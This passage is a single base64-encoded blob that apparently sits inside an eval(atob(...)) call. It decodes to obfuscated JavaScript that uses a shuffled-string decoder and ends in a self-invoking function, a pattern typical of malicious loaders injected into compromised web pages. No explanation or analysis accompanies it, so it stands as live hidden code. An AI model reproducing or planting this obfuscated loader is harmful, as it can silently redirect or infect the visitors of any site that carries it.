y4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
